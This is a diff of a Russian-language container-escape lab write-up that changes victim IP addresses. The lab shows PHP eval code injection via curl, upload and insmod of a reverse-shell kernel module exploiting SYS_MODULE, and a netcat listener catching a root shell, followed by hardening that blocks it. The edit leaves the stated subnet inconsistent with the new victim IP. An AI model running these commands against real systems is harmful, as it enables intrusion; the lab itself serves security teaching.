@@ -42,7 +42,7 @@ docker-compose.yml: `cap_add: ["SYS_MODULE"]`
 
 Для взаимодействия между хостами `victim` и `hacker` организована сеть 192.168.50.0/24. Настройки хостов:
 
-- `victim` IP: 192.168.50.4;
+- `victim` IP: 192.168.56.4;
 - `hacker` IP: 192.168.50.5.
 
 Для запуска стенда выполните команду:
@@ -129,7 +129,7 @@ $ vagrant ssh hacker
 Проверим от имени какого пользователя запущено web-приложение, для этого выполним команду `id`:
 
 ```
-vagrant@hacker:~$ curl -G 192.168.50.4 --data-urlencode "code=system('id');"
+vagrant@hacker:~$ curl -G 192.168.56.4 --data-urlencode "code=system('id');"
   <h1> Hello world!</h1>
   uid=0(root) gid=0(root) groups=0(root)
   <br>
@@ -141,7 +141,7 @@ root.
 Проверим доступность команды `capsh`, которая позволит нам просмотреть доступные нам разрешения:
 
 ```
-vagrant@hacker:~$ curl -G 192.168.50.4 --data-urlencode "code=system('whereis capsh');"
+vagrant@hacker:~$ curl -G 192.168.56.4 --data-urlencode "code=system('whereis capsh');"
   <h1> Hello world!</h1>
   capsh:
   <br>
@@ -150,7 +150,7 @@ vagrant@hacker:~$ curl -G 192.168.50.4 --data-urlencode "code=system('whereis ca
 Команда capsh не найдена. Установим ее:
 
 ```
-vagrant@hacker:~$ curl -G 192.168.50.4 \
+vagrant@hacker:~$ curl -G 192.168.56.4 \
   --data-urlencode "code=system('apt-get update && apt-get install -y libcap2-bin kmod');"
 ...
 ```
@@ -158,7 +158,7 @@ vagrant@hacker:~$ curl -G 192.168.50.4 \
 Теперь посмотрим доступные разрешения:
 
 ```
-vagrant@hacker:~$ curl -G 192.168.50.4 --data-urlencode "code=system('capsh --print');"
+vagrant@hacker:~$ curl -G 192.168.56.4 --data-urlencode "code=system('capsh --print');"
   <h1> Hello world!</h1>
   Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+eip
   Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
@@ -207,7 +207,7 @@ move_uploaded_file($_FILES['shell']['tmp_name'], 'reverse-shell.ko');
 Произведем urlencoding этой строки и выполним получившийся запрос:
 
 ```
-vagrant@hacker:~$ curl -v  -X POST 192.168.50.4/?code=move_uploaded_file%28%24_FILES%5B%27shell%27%5D%5B%27tmp_name%27%5D%2C%20%27reverse-shell.ko%27%29%3B \
+vagrant@hacker:~$ curl -v  -X POST 192.168.56.4/?code=move_uploaded_file%28%24_FILES%5B%27shell%27%5D%5B%27tmp_name%27%5D%2C%20%27reverse-shell.ko%27%29%3B \
 -F 'shell=@reverse-shell.ko'
 ```
 
@@ -222,7 +222,7 @@ vagrant@hacker:~$ nc -vnlp 4444
 Теперь загрузим модуль:
 
 ```
-vagrant@hacker:~$ curl -G 192.168.50.4 --data-urlencode "code=system('insmod reverse-shell.ko');"
+vagrant@hacker:~$ curl -G 192.168.56.4 --data-urlencode "code=system('insmod reverse-shell.ko');"
   <h1> Hello world!</h1>
   <br>
 ```
@@ -232,7 +232,7 @@ vagrant@hacker:~$ curl -G 192.168.50.4 --data-urlencode "code=system('insmod rev
 ```
 vagrant@hacker:~$ nc -vnlp 4444
   listening on [any] 4444 ...
-  connect to [192.168.50.5] from (UNKNOWN) [192.168.50.4] 39060
+  connect to [192.168.56.5] from (UNKNOWN) [192.168.56.4] 39060
   bash: cannot set terminal process group (-1): Inappropriate ioctl for device
   bash: no job control in this shell
 root@victim:/# id
@@ -285,7 +285,7 @@ vagrant@victim:/vagrant/victim$ docker-compose up --build -d
 
 ```
 $ vagrant ssh hacker
-vagrant@hacker:~$ curl -G 192.168.50.4 --data-urlencode "code=system('id');"
+vagrant@hacker:~$ curl -G 192.168.56.4 --data-urlencode "code=system('id');"
   <h1> Hello world!</h1>
   uid=1000 gid=0(root) groups=0(root)
   <br>
@@ -294,7 +294,7 @@ vagrant@hacker:~$ curl -G 192.168.50.4 --data-urlencode "code=system('id');"
 Как мы видим приложение запущено из под пользователя с UID=1000. Тем не менее попробуем установить необходимые пакеты:
 
 ```
-vagrant@hacker:~$ curl -G 192.168.50.4 --data-urlencode "code=system('apt-get update 2>&1 && apt-get install -y libcap2-bin kmod 2>&1');"
+vagrant@hacker:~$ curl -G 192.168.56.4 --data-urlencode "code=system('apt-get update 2>&1 && apt-get install -y libcap2-bin kmod 2>&1');"
   <h1> Hello world!</h1>
   Reading package lists...
   E: List directory /var/lib/apt/lists/partial is missing. - Acquire (13: Permission denied)
@@ -305,7 +305,7 @@ vagrant@hacker:~$ curl -G 192.168.50.4 --data-urlencode "code=system('apt-get up
 
 ```
 vagrant@hacker:~$ cd /vagrant/hacker/
-vagrant@hacker:/vagrant/hacker$ curl -X POST 192.168.50.4/?code=move_uploaded_file%28%24_FILES%5B%27shell%27%5D%5B%27tmp_name%27%5D%2C%20%27reverse-shell.ko%27%29%3B -F 'shell=@reverse-shell.ko'
+vagrant@hacker:/vagrant/hacker$ curl -X POST 192.168.56.4/?code=move_uploaded_file%28%24_FILES%5B%27shell%27%5D%5B%27tmp_name%27%5D%2C%20%27reverse-shell.ko%27%29%3B -F 'shell=@reverse-shell.ko'
   <h1> Hello world!</h1>
   <br />
   <b>Warning</b>:  move_uploaded_file(reverse-shell.ko): failed to open stream: Permission denied in <b>/app/index.php(3) : eval()'d code</b> on line <b>1</b><br />
@@ -406,7 +406,7 @@ vagrant@victim:/vagrant/victim$ docker-compose up --build -d
 Зайдём на хост `hacker` и проверим из под какого пользователя запущен наш web-сервер:
 
 ```
-vagrant@hacker:~$ curl -G 192.168.50.4 --data-urlencode "code=system('id');"
+vagrant@hacker:~$ curl -G 192.168.56.4 --data-urlencode "code=system('id');"
   <h1> Hello world!</h1>
   uid=1000(web) gid=1000(web) groups=1000(web)
   <br>
